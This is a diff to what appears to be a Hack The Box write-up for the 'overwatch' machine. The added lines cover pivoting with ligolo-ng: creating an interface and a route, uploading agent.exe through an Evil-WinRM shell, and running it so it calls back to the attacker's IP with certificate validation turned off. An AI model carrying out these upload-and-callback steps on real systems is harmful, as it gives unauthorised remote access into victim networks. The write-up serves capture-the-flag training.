@@ -520,6 +520,38 @@ sudo ./proxy -selfcert
 Ill start up the proxy on my attacker machine
 
 ```python
+ligolo-ng » ifcreate --name overwatch
+INFO[0013] Creating a new overwatch interface...        
+INFO[0013] Interface created!                           
+ligolo-ng » route_add --name overwatch --route 240.0.0.1/32
+INFO[0044] Route created.
+```
+
+Then ill add the routing info
+
+```python
+*Evil-WinRM* PS C:\Temp> upload agent.exe
+                                        
+Info: Uploading /home/kali/htb/overwatch/agent.exe to C:\Temp\agent.exe
+                                        
+Data: 9800360 bytes of 9800360 bytes copied
+                                        
+Info: Upload successful!
+```
+
+Then ill upload the agent to the target
+
+```python
+*Evil-WinRM* PS C:\Temp> .\agent.exe -connect 10.10.14.61:11601 --ignore-cert
+agent.exe : time="2026-08-10T09:45:04-07:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2026-08-1...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2026-08-10T09:45:04-07:00" level=info msg="Connection established" addr="10.10.14.61:11601"
+```
+
+Then ill execute the agent to connect back to me
+
+```python
 
 ```
 
